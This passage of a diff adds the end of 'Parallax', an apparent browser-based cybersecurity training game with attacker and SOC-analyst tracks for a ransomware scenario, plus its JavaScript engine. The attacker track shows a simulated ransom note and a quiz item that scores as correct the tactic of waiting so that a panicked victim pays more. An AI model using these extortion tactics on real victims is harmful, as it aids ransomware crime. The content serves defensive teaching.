+       output:["YOUR NETWORK HAS BEEN ENCRYPTED BY LOCKBIT 3.0","","All files on 134 systems have been encrypted.","Your backups have been deleted.","500GB of data has been exfiltrated.","","TO RECOVER YOUR FILES:","1. Visit: http://lockbit3u3okmz[.]onion","2. Enter ID: ACME-2024-9471","3. Pay $2,400,000 USD in Bitcoin within 72 hours","","DO NOT contact law enforcement — your data will be","published immediately if you do.","","[*] C2 beacon active — awaiting victim contact","[*] Data published on leak site if no payment in 72h","[*] Average victim pays within 48 hours"],
+       desc:"The ransom note combines the encryption threat with data exfiltration leverage. The Tor-based C2 infrastructure makes attribution and takedown extremely difficult.",
+       why:"Double extortion makes ransomware effective even against organisations with working backups. The data publication threat is often more damaging than the encryption itself.",
+       choices:[
+         {t:"Remain silent, wait for victim contact, negotiate from a position of maximum leverage",c:true,explain:"Professional ransomware groups maintain negotiation teams. Waiting gives the victim time to panic, assess damage, and recognise the scale — maximising willingness to pay."},
+         {t:"Immediately demand payment and threaten to publish data",c:false,explain:"Immediate pressure gives the victim no time to assess — they may call law enforcement out of panic. Controlled pressure after they've seen the full damage is more effective."},
+         {t:"Provide the decryption key immediately to prove trustworthiness",c:false,explain:"Providing the key before payment removes all leverage. Ransomware groups provide proof-of-decryption for a small number of files only, to prove capability."},
+       ]}
+    ]
+  },
+  soc:{
+    prompt:"analyst@soc:~$",
+    intro:["[*] CRITICAL: EDR going offline across the estate","[*] Mission: Detect ransomware pre-encryption, contain, recover","[*] Tools: EDR, Offline Backups, Incident Response Plan",""],
+    steps:[
+      {name:"EDR mass offline alert",tool:"CrowdStrike Falcon",
+       cmd:"falcon-console> sensor-status --last 1h --state offline\nfalcon-console> timeline --event sensor-uninstall --last 2h",
+       output:["[CRITICAL] 127 sensors went offline in the last 47 minutes","[CRITICAL] Sensors disabled via: GPO policy change","[CRITICAL] Event logs cleared on 89 hosts","Timeline:","  13:21 — Domain Admin GPO created: DisableEDR","  13:22 — CrowdStrike service stopped on DC01","  13:23 — Mass sensor disable propagated via GPO","  13:31 — Event log cleared on all hosts","[!] THIS IS A RANSOMWARE PRE-CURSOR EVENT","[IMMEDIATE ACTION REQUIRED]"],
+       desc:"Mass EDR sensor loss is one of the highest-fidelity ransomware pre-cursor indicators. It means the attacker already has Domain Admin and is preparing for encryption.",
+       why:"Monitoring the EDR management console for mass sensor loss is critical. The alert that security tools are being disabled IS the ransomware warning — act immediately.",
+       choices:[
+         {t:"Declare a P1 incident, isolate the network from internet, initiate IR plan immediately",c:true,explain:"This is not a drill. Mass EDR disable means ransomware deployment is imminent or already underway. Every minute of hesitation costs millions. Declare P1 and isolate immediately."},
+         {t:"Investigate why EDR went offline before taking drastic action",c:false,explain:"Investigation comes after containment. With 127 sensors offline via GPO, the attacker has Domain Admin. There is no legitimate explanation — act immediately."},
+         {t:"Re-deploy EDR to the offline hosts and monitor",c:false,explain:"The attacker will simply disable it again. You need to cut network access and isolate while you still have time."},
+       ]},
+      {name:"Emergency network isolation",tool:"Firewall + Network ACLs",
+       cmd:"# Emergency isolation — cut external connectivity\nfirewall-cmd --add-rich-rule='rule family=ipv4 source address=0.0.0.0/0 drop' --permanent\nfirewall-cmd --reload\n\n# Isolate VLAN segments from each other\nswitch-cli> vlan isolate finance production HR\n\n# Kill all active VPN sessions\nvpn-admin> disconnect-all-sessions --confirm",
+       output:["[+] All external internet connectivity: BLOCKED","[+] VLAN isolation applied — segments cannot communicate","[+] All 47 active VPN sessions terminated","[+] Inter-VLAN routing: DISABLED","","[*] Ransomware C2 communication: SEVERED","[*] Lateral propagation: PREVENTED","[*] Encryption activity detected on 12 hosts before isolation","[*] 122 hosts protected from encryption","[+] Network isolation contained the attack"],
+       desc:"Emergency network isolation severs C2 communication, stops lateral propagation, and prevents encrypted files from being exfiltrated — at the cost of full business disruption.",
+       why:"The decision to isolate the entire network is one of the most difficult in incident response. Every minute of delay allows encryption to spread to more systems.",
+       choices:[
+         {t:"Maintain full network isolation until all hosts are verified clean — accept full business disruption",c:true,explain:"Partial isolation risks re-infection from compromised hosts still on the network. Full isolation is painful but correct. Business disruption beats ransom payment."},
+         {t:"Keep critical systems online to maintain business continuity",c:false,explain:"Connected 'critical systems' provide the attacker with a path back in. Full isolation or full compromise — there is no middle ground in active ransomware."},
+         {t:"Reconnect to the internet to allow the IR team remote access",c:false,explain:"IR teams use out-of-band access (4G, dedicated IR VPN). Reconnecting the compromised network gives the attacker their C2 channel back."},
+       ]},
+      {name:"Backup integrity verification",tool:"Backup Solution + Offline Storage",
+       cmd:"# Check backup integrity — were backups corrupted?\nveeam-cli> verify-backup --repository offsite-tape --last 7d\nveeam-cli> verify-backup --repository cloud-immutable --last 7d\nveeam-cli> verify-backup --repository nas-onprem --last 7d",
+       output:["Offsite tape (air-gapped):","  Last backup: 3 days ago — INTACT ✓","  Files: 2.1TB — all hashes verified","","Cloud immutable (S3 Object Lock):","  Last backup: yesterday 02:00 — INTACT ✓","  Immutable lock: 30 days — CANNOT be deleted","","On-premises NAS:","  CORRUPTED ✗ — backup operator account used to delete","  Last good backup: 4 days ago","","[+] 2 of 3 backup repositories intact","[+] Recovery possible from air-gapped and cloud immutable"],
+       desc:"Backup integrity verification determines recovery options. The on-premises NAS was accessible and corrupted — only air-gapped and immutable cloud backups survived.",
+       why:"The 3-2-1-1-0 backup rule: 3 copies, 2 media types, 1 offsite, 1 air-gapped, 0 unverified restores. The air-gapped and immutable backups survived because they were inaccessible to the attacker.",
+       choices:[
+         {t:"Restore from air-gapped tape backup — do NOT pay the ransom — engage law enforcement",c:true,explain:"Working backups mean zero leverage for the attacker. Never pay when you have clean backups. Engage FBI/NCA — ransomware groups are increasingly prosecuted."},
+         {t:"Pay the ransom to recover faster and avoid data publication",c:false,explain:"You have working backups. Paying funds criminal organisations, encourages future attacks, and provides no guarantee of decryption or data deletion. Never pay when alternatives exist."},
+         {t:"Negotiate with the attacker to reduce the ransom amount",c:false,explain:"Negotiation signals willingness to pay and buys the attacker time. With clean backups, there is nothing to negotiate — restore and recover."},
+       ]},
+      {name:"Recovery and hardening",tool:"Incident Response Plan",
+       cmd:"# Systematic recovery from clean backups\n# Rebuild domain from scratch — do not restore DC\nveeam-cli> restore --repository offsite-tape --target clean-dc\n\n# Post-incident hardening\ncobalt-strike-detect --scan-all-hosts  # find remaining C2 beacons\nreset-krbtgt-twice  # invalidate all Kerberos tickets\nprivilege-audit --remove-unnecessary-da  # reduce Domain Admin count",
+       output:["[+] Clean DC restored from air-gapped backup","[+] All 122 unencrypted hosts wiped and rebuilt","[+] 12 encrypted hosts restored from cloud immutable backup","[+] krbtgt password rotated twice — all tickets invalidated","[+] Domain Admin accounts reduced from 47 to 6","[+] Cobalt Strike beacons found and removed: 3 hosts","[+] All service account passwords rotated via PAM","[*] Full recovery: 72 hours","[*] Cost without cyber insurance: est. £840,000","[*] Cost if ransom paid: £2.4M + recovery costs"],
+       desc:"Full recovery requires rebuilding from clean backups, not just decrypting. Domain Controllers especially should be rebuilt — a compromised DC cannot be trusted even after decryption.",
+       why:"Recovery time with good backups (72h) vs paying ransom (avg 21 days downtime) vs no backups (weeks to months). Backups are the single most important ransomware defence.",
+       choices:[
+         {t:"Rebuild all systems from clean backups, never restore the DC, rotate all credentials, remove C2 beacons",c:true,explain:"Complete remediation. Rebuilding rather than restoring the DC ensures no attacker persistence survives. Credential rotation invalidates all harvested passwords and hashes."},
+         {t:"Decrypt the affected systems using the attacker's decryption key and restore from there",c:false,explain:"Even after decryption, attacker backdoors, C2 beacons, and modified configurations remain. Always wipe and rebuild from known-clean backups."},
+         {t:"Restore only the encrypted files and leave the rest of the environment as-is",c:false,explain:"The attacker still has Domain Admin, active C2 beacons, and all harvested credentials. Restoring files without remediating the root compromise achieves nothing."},
+       ]}
+    ]
+  },
+  lessons:[
+    "Mass EDR sensor loss is a critical ransomware pre-cursor. Monitor your EDR console for sensors going offline — that alert IS the ransomware warning.",
+    "Ransomware operators wait 24–48 hours after disabling security tools to ensure backup jobs capture encrypted files. Immutable and air-gapped backups defeat this strategy.",
+    "The 3-2-1-1-0 backup rule: 3 copies, 2 media types, 1 offsite, 1 air-gapped, 0 unverified. Only air-gapped and immutable backups survived this attack.",
+    "Never pay the ransom when you have working backups. Payment funds criminal organisations and provides no guarantee of recovery or data deletion.",
+    "Rebuild Domain Controllers from scratch after ransomware — never restore a compromised DC. A DC that had Domain Admin-level attacker access cannot be trusted."
+  ]
+}
+];
+
+// ── STATE ──────────────────────────────────────────────────────────────────────
+let scenario=null,role='hacker',step=0,totalScore=0,totalCorrect=0,totalAnswered=0;
+let hkScore=0,socScore=0,hkCorrect=0,socCorrect=0,playedRoles={hacker:false,soc:false};
+
+function show(id){document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));document.getElementById(id).classList.add('active');}
+
+function selectScenario(idx){
+  scenario=SCENARIOS[idx];
+  playedRoles={hacker:false,soc:false};hkScore=0;socScore=0;hkCorrect=0;socCorrect=0;
+  document.getElementById('role-scenario-title').textContent=scenario.name;
+  const ht=document.getElementById('hacker-tools');
+  ht.innerHTML=scenario.hackerTools.map(t=>`<span class="tool-chip">${t}</span>`).join('');
+  const st=document.getElementById('soc-tools');
+  st.innerHTML=scenario.socTools.map(t=>`<span class="tool-chip">${t}</span>`).join('');
+  show('s-role');
+}
+
+function startRole(r){
+  role=r;step=0;playedRoles[r]=true;
+  const data=scenario[r];
+  const isAtk=r==='hacker';
+  document.getElementById('topbar-scenario').textContent=scenario.name;
+  document.getElementById('topbar-role').textContent=isAtk?'🦹 Attacker':'🧑‍💻 SOC Analyst';
+  document.getElementById('topbar-role').className='topbar-role-badge '+(isAtk?'attacker':'defender');
+  document.getElementById('term-title').textContent=data.prompt;
+  document.getElementById('g-score').textContent=totalScore;
+  buildProgress();
+  const tb=document.getElementById('term-body');
+  tb.innerHTML='<span class="tl-cursor'+(isAtk?' red':'')+'"></span>';
+  typeLines(data.intro,()=>loadStep(0));
+  show('s-game');
+}
+
+function buildProgress(){
+  const steps=scenario[role].steps;
+  document.getElementById('prog-wrap').innerHTML=steps.map((_,i)=>`<div class="prog-dot" id="pd-${i}"></div>`).join('');
+  updateProgress();
+}
+function updateProgress(){
+  scenario[role].steps.forEach((_,i)=>{
+    const el=document.getElementById('pd-'+i);if(!el)return;
+    el.className='prog-dot'+(i<step?' done':i===step?' active':'');
+  });
+}
+
+// ── TERMINAL ──────────────────────────────────────────────────────────────────
+function addLine(txt,cls='tl-out'){
+  const tb=document.getElementById('term-body');
+  const cur=tb.querySelector('.tl-cursor');
+  const d=document.createElement('div');d.className='tl';
+  d.innerHTML=`<span class="${cls}">${txt}</span>`;
+  cur?tb.insertBefore(d,cur):tb.appendChild(d);
+  tb.scrollTop=tb.scrollHeight;
+}
+
+function typeCmd(cmd,cb){
+  const tb=document.getElementById('term-body');
+  const isAtk=role==='hacker';
+  const prompt=scenario[role].prompt;
+  const cur=tb.querySelector('.tl-cursor');
+  const row=document.createElement('div');row.className='tl';
+  const ps=document.createElement('span');ps.className='tl-prompt'+(isAtk?' red':'');ps.textContent=prompt+' ';
+  const cs=document.createElement('span');cs.className='tl-cmd';
+  row.appendChild(ps);row.appendChild(cs);
+  cur?tb.insertBefore(row,cur):tb.appendChild(row);
+  const lines=cmd.split('\n');let li=0,ci=0;
+  const iv=setInterval(()=>{
+    if(li>=lines.length){clearInterval(iv);if(cb)setTimeout(cb,200);return;}
+    if(ci<lines[li].length){cs.textContent+=lines[li][ci++];}
+    else{
+      li++;ci=0;
+      if(li<lines.length){
+        const nr=document.createElement('div');nr.className='tl';
+        const nc=document.createElement('span');nc.className='tl-cmd';nr.appendChild(nc);
+        cur?tb.insertBefore(nr,cur):tb.appendChild(nr);
+        Object.defineProperty(cs,'textContent',{get:()=>nc.textContent,set:v=>nc.textContent=v});
+      }
+    }
+    tb.scrollTop=tb.scrollHeight;
+  },20);
+}
+
+function typeLines(lines,cb,delay=22){
+  let i=0;
+  function next(){
+    if(i>=lines.length){if(cb)cb();return;}
+    const l=lines[i++];
+    const cls=l.startsWith('[+]')?'tl-success':l.startsWith('[!]')?'tl-warn':l.startsWith('[ALERT]')||l.startsWith('[CRITICAL]')||l.startsWith('[COMPROMISED]')?'tl-error':l.startsWith('[*]')?'tl-out':'tl-data';
+    addLine(l,cls);
+    setTimeout(next,delay+Math.random()*25);
+  }
+  next();
+}
+
+function loadStep(idx){
+  step=idx;updateProgress();
+  const s=scenario[role].steps[idx];
+  addLine('','tl-out');
+  typeCmd(s.cmd,()=>{
+    setTimeout(()=>typeLines(s.output,()=>setTimeout(()=>buildInfoPanel(s),350)),300);
+  });
+}
+
+function buildInfoPanel(s){
+  const isAtk=role==='hacker';
+  const btnCls=isAtk?'attacker-btn':'defender-btn';
+  const nextCls=isAtk?'attacker-next':'defender-next';
+  const totalSteps=scenario[role].steps.length;
+  document.getElementById('info-scroll').innerHTML=`
+  <div class="step-header">
+    <div class="step-title">${s.name}</div>
+    <span class="tool-badge">${s.tool}</span>
+  </div>
+  <div class="info-section">
+    <div class="info-section-label">What's happening</div>
+    <div class="info-card">${s.desc}</div>
+  </div>
+  <div class="info-section">
+    <div class="info-section-label">Why it matters</div>
+    <div class="why-card">${s.why}</div>
+  </div>
+  <div class="info-section">
+    <div class="info-section-label">Your move — choose the best action</div>
+    <div class="choices-wrap">${s.choices.map((c,i)=>`<button class="choice-btn ${btnCls}" id="cb-${i}" onclick="pickChoice(${i})">${c.t}</button>`).join('')}</div>
+    <div class="feedback-card" id="fb"></div>
+    <button class="next-btn ${nextCls}" id="nb" onclick="advanceStep()">${step<totalSteps-1?'Next step →':'Complete scenario ✓'}</button>
+  </div>`;
+}
+
+function pickChoice(i){
+  const s=scenario[role].steps[step];
+  const c=s.choices[i];
+  const isAtk=role==='hacker';
+  totalAnswered++;
+  document.querySelectorAll('.choice-btn').forEach((b,j)=>{
+    b.disabled=true;
+    if(s.choices[j].c)b.classList.add('correct');
+    else if(j===i)b.classList.add('wrong');
+  });
+  const fb=document.getElementById('fb');
+  fb.style.display='block';
+  if(c.c){
+    totalScore+=100;totalCorrect++;
+    if(isAtk){hkScore+=100;hkCorrect++;}else{socScore+=100;socCorrect++;}
+    fb.className='feedback-card fb-correct';
+    fb.textContent='✅ Correct — '+c.explain;
+    addLine('[+] Correct approach. Action executed.',isAtk?'tl-success':'tl-success');
+  }else{
+    fb.className='feedback-card fb-wrong';
+    fb.textContent='❌ Suboptimal — '+c.explain;
+    addLine('[!] Suboptimal choice. Review the recommended approach.','tl-warn');
+  }
+  document.getElementById('nb').style.display='block';
+  document.getElementById('g-score').textContent=totalScore;
+}
+
+function advanceStep(){
+  if(step<scenario[role].steps.length-1)loadStep(step+1);
+  else showDebrief();
+}
+
+function showDebrief(){
+  const sc=scenario;
+  const answered=sc[role].steps.length;
+  const correct=role==='hacker'?hkCorrect:socCorrect;
+  const acc=Math.round(correct/answered*100);
+  document.getElementById('db-scenario-name').textContent=sc.icon+' '+sc.name;
+  document.getElementById('db-score').textContent=totalScore;
+  document.getElementById('db-correct').textContent=correct+'/'+answered;
+  document.getElementById('db-acc').textContent=acc+'%';
+  document.getElementById('db-atk').innerHTML=sc.hacker.steps.map(s=>`
+    <div class="db-step atk">
+      <div class="db-step-name">${s.name}</div>
+      <div class="db-step-tool">${s.tool} — ${s.cmd.split('\n')[0]}</div>
+      <div class="db-step-desc">${s.desc.substring(0,110)}...</div>
+    </div>`).join('');
+  document.getElementById('db-def').innerHTML=sc.soc.steps.map(s=>`
+    <div class="db-step def">
+      <div class="db-step-name">${s.name}</div>
+      <div class="db-step-tool">${s.tool} — ${s.cmd.split('\n')[0]}</div>
+      <div class="db-step-desc">${s.desc.substring(0,110)}...</div>
+    </div>`).join('');
+  document.getElementById('db-lessons').innerHTML=sc.lessons.map(l=>`
+    <div class="lesson-item"><div class="lesson-dot"></div><span>${l}</span></div>`).join('');
+  const other=role==='hacker'?'soc':'hacker';
+  document.getElementById('db-other-btn').textContent=role==='hacker'?'Play defender side →':'Play attacker side →';
+  show('s-debrief');
+}
+
+function playOtherSide(){startRole(role==='hacker'?'soc':'hacker');}
+
+// ── LOADING SCREEN ──────────────────────────────────────────────────────────
+const loadSteps=['Initialising...','Loading scenarios...','Building terminal...','Preparing simulations...','Ready.'];
+let loadPct=0;
+const loadIv=setInterval(()=>{
+  loadPct+=2;
+  document.getElementById('load-bar').style.width=loadPct+'%';
+  const si=Math.floor(loadPct/25);
+  document.getElementById('load-status').textContent=loadSteps[Math.min(si,loadSteps.length-1)];
+  if(loadPct>=100){
+    clearInterval(loadIv);
+    setTimeout(()=>{
+      document.getElementById('s-loading').classList.add('fade-out');
+      setTimeout(()=>document.getElementById('s-loading').style.display='none',600);
+    },300);
+  }
+},30);
+
+// ── PROGRESS PERSISTENCE ────────────────────────────────────────────────────
+function saveProgress(){
+  try{localStorage.setItem('parallax_progress',JSON.stringify({totalScore,totalCorrect,totalAnswered,completedScenarios:JSON.parse(localStorage.getItem('parallax_progress')||'{}').completedScenarios||[]}));}catch(e){}
+}
+function loadProgress(){
+  try{
+    const p=JSON.parse(localStorage.getItem('parallax_progress')||'{}');
+    if(p.totalScore){totalScore=p.totalScore||0;totalCorrect=p.totalCorrect||0;totalAnswered=p.totalAnswered||0;}
+  }catch(e){}
+}
+function markScenarioComplete(id){
+  try{
+    const p=JSON.parse(localStorage.getItem('parallax_progress')||'{}');
+    const c=p.completedScenarios||[];
+    if(!c.includes(id))c.push(id);
+    p.completedScenarios=c;
+    localStorage.setItem('parallax_progress',JSON.stringify(p));
+    updateScenarioCards();
+  }catch(e){}
+}
+function getCompletedScenarios(){
+  try{return JSON.parse(localStorage.getItem('parallax_progress')||'{}').completedScenarios||[];}catch(e){return[];}
+}
+function updateScenarioCards(){
+  const done=getCompletedScenarios();
+  document.querySelectorAll('.sc-card').forEach((card,i)=>{
+    const existing=card.querySelector('.sc-complete-badge');
+    if(done.includes(i)){
+      if(!existing){
+        const b=document.createElement('div');
+        b.className='sc-complete-badge';
+        b.style.cssText='position:absolute;top:10px;right:10px;font-size:10px;font-weight:600;padding:3px 8px;border-radius:20px;background:var(--green-bg);color:var(--green);border:1px solid var(--green-light);';
+        b.textContent='✓ Done';
+        card.style.position='relative';
+        card.appendChild(b);
+      }
+    }
+  });
+}
+
+// ── SHARE ───────────────────────────────────────────────────────────────────
+function openShare(){
+  const acc=totalAnswered>0?Math.round(totalCorrect/totalAnswered*100):0;
+  document.getElementById('sh-score').textContent=totalScore;
+  document.getElementById('sh-scenarios').textContent=getCompletedScenarios().length;
+  document.getElementById('sh-correct').textContent=totalCorrect;
+  document.getElementById('sh-acc').textContent=acc+'%';
+  document.getElementById('share-overlay').classList.add('active');
+  gtag('event','share_open',{score:totalScore});
+}
+function closeShare(){document.getElementById('share-overlay').classList.remove('active');}
+function copyShareLink(){
+  navigator.clipboard.writeText('https://parallax.sarathg.me').then(()=>{
+    const btn=document.querySelector('.share-btn.copy');
+    btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy link',2000);
+  });
+  gtag('event','share_copy');
+}
+function shareTwitter(){
+  const acc=totalAnswered>0?Math.round(totalCorrect/totalAnswered*100):0;
+  const txt=encodeURIComponent(`I scored ${totalScore} points on Parallax with ${acc}% accuracy — a dual POV cybersecurity simulation. Can you do better?\n\nhttps://parallax.sarathg.me`);
+  window.open('https://twitter.com/intent/tweet?text='+txt,'_blank');
+  gtag('event','share_twitter');
+}
+
+// ── CERTIFICATE ─────────────────────────────────────────────────────────────
+function openCert(){
+  const done=getCompletedScenarios();
+  if(done.length===0){alert('Complete at least one scenario to earn a certificate.');return;}
+  drawCertificate();
+  document.getElementById('cert-overlay').classList.add('active');
+  gtag('event','cert_open',{scenarios_done:done.length});
+}
+function closeCert(){document.getElementById('cert-overlay').classList.remove('active');}
+function drawCertificate(){
+  const canvas=document.getElementById('cert-canvas');
+  const ctx=canvas.getContext('2d');
+  const W=800,H=560;
+  const done=getCompletedScenarios();
+  const acc=totalAnswered>0?Math.round(totalCorrect/totalAnswered*100):0;
+  const date=new Date().toLocaleDateString('en-GB',{day:'numeric',month:'long',year:'numeric'});
+
+  // Background
+  ctx.fillStyle='#0f1117';ctx.fillRect(0,0,W,H);
+
+  // Dot grid
+  ctx.fillStyle='#2a2d3a';
+  for(let x=20;x<W;x+=28)for(let y=20;y<H;y+=28){ctx.beginPath();ctx.arc(x,y,1,0,Math.PI*2);ctx.fill();}
+
+  // Border frame
+  ctx.strokeStyle='#2a2d3a';ctx.lineWidth=1;ctx.strokeRect(20,20,W-40,H-40);
+  ctx.strokeStyle='#4d9fff44';ctx.lineWidth=0.5;ctx.strokeRect(28,28,W-56,H-56);
+
+  // Top accent line
+  ctx.fillStyle='#4d9fff';ctx.fillRect(20,20,W-40,3);
+
+  // Logo
+  ctx.fillStyle='#e2e4ed';ctx.font='700 13px -apple-system,sans-serif';
+  ctx.letterSpacing='4px';ctx.textAlign='center';ctx.fillText('⬡  PARALLAX',W/2,72);
+  ctx.letterSpacing='0px';
+
+  // Certificate of completion
+  ctx.fillStyle='#555a6e';ctx.font='11px -apple-system,sans-serif';
+  ctx.fillText('CERTIFICATE OF COMPLETION',W/2,100);
+
+  // Divider
+  ctx.strokeStyle='#2a2d3a';ctx.lineWidth=1;
+  ctx.beginPath();ctx.moveTo(120,114);ctx.lineTo(W-120,114);ctx.stroke();
+
+  // Main text
+  ctx.fillStyle='#8b90a0';ctx.font='14px -apple-system,sans-serif';
+  ctx.fillText('This certifies that the holder has successfully completed',W/2,148);
+
+  ctx.fillStyle='#e2e4ed';ctx.font='700 28px -apple-system,sans-serif';
+  ctx.fillText('Cybersecurity Dual POV Simulation',W/2,190);
+
+  ctx.fillStyle='#8b90a0';ctx.font='14px -apple-system,sans-serif';
+  ctx.fillText('demonstrating knowledge of both offensive and defensive security techniques',W/2,220);
+
+  // Stats row
+  const stats=[['Scenarios',''+done.length+' / 6'],['Score',''+totalScore],['Accuracy',acc+'%'],['Techniques','48']];
+  const sw=(W-160)/stats.length;
+  stats.forEach(([l,v],i)=>{
+    const x=80+i*sw+sw/2;
+    ctx.fillStyle='#21242f';ctx.beginPath();ctx.roundRect(x-50,244,100,64,8);ctx.fill();
+    ctx.strokeStyle='#2a2d3a';ctx.lineWidth=1;ctx.stroke();
+    ctx.fillStyle='#4d9fff';ctx.font='700 20px -apple-system,sans-serif';ctx.fillText(v,x,274);
+    ctx.fillStyle='#555a6e';ctx.font='10px -apple-system,sans-serif';ctx.fillText(l.toUpperCase(),x,292);
+  });
+
+  // Scenarios completed
+  ctx.fillStyle='#555a6e';ctx.font='11px -apple-system,sans-serif';
+  ctx.fillText('SCENARIOS COMPLETED',W/2,338);
+  const scNames=['OSINT Recon','Phishing','Network Intrusion','Social Engineering','Priv. Escalation','Ransomware'];
+  const pillW=110,pillH=26,pillGap=8;
+  const totalPillW=scNames.length*(pillW+pillGap)-pillGap;
+  scNames.forEach((n,i)=>{
+    const px=(W-totalPillW)/2+i*(pillW+pillGap);
+    const completed=done.includes(i);
+    ctx.fillStyle=completed?'#133028':'#1a1d27';
+    ctx.strokeStyle=completed?'#3ecf8e44':'#2a2d3a';
+    ctx.lineWidth=1;ctx.beginPath();ctx.roundRect(px,350,pillW,pillH,5);ctx.fill();ctx.stroke();
+    ctx.fillStyle=completed?'#3ecf8e':'#555a6e';
+    ctx.font='10px -apple-system,sans-serif';ctx.fillText((completed?'✓ ':'')+n,px+pillW/2,368);
+  });
+
+  // Bottom divider
+  ctx.strokeStyle='#2a2d3a';ctx.lineWidth=1;
+  ctx.beginPath();ctx.moveTo(120,398);ctx.lineTo(W-120,398);ctx.stroke();
+
+  // Footer
+  ctx.fillStyle='#555a6e';ctx.font='12px -apple-system,sans-serif';
+  ctx.fillText('parallax.sarathg.me',W/2,426);
+  ctx.fillStyle='#3a3d4a';ctx.font='11px -apple-system,sans-serif';
+  ctx.fillText('Issued: '+date,W/2,448);
+
+  // Bottom accent
+  ctx.fillStyle='#4d9fff';ctx.fillRect(20,H-23,W-40,3);
+}
+function downloadCert(){
+  const canvas=document.getElementById('cert-canvas');
+  const link=document.createElement('a');
+  link.download='parallax-certificate.png';
+  link.href=canvas.toDataURL('image/png');
+  link.click();
+  gtag('event','cert_download');
+}
+
+// ── ANALYTICS HELPERS ───────────────────────────────────────────────────────
+function gtag(){if(window.dataLayer){window.dataLayer.push(arguments);}}
+function trackScenarioStart(name,role){gtag('event','scenario_start',{scenario:name,role});}
+function trackScenarioComplete(name,role,score){
+  gtag('event','scenario_complete',{scenario:name,role,score});
+  markScenarioComplete(SCENARIOS.findIndex(s=>s.name===name));
+  saveProgress();
+}
+
+// Patch startRole and showDebrief to emit analytics
+const _origStartRole=startRole;
+startRole=function(r){
+  _origStartRole(r);
+  trackScenarioStart(scenario.name,r);
+};
+const _origShowDebrief=showDebrief;
+showDebrief=function(){
+  _origShowDebrief();
+  trackScenarioComplete(scenario.name,role,role==='hacker'?hkScore:socScore);
+};
+
+// ── BOOT ────────────────────────────────────────────────────────────────────
+loadProgress();
+document.addEventListener('DOMContentLoaded',()=>setTimeout(updateScenarioCards,100));
+</script>
+</body>
+</html>
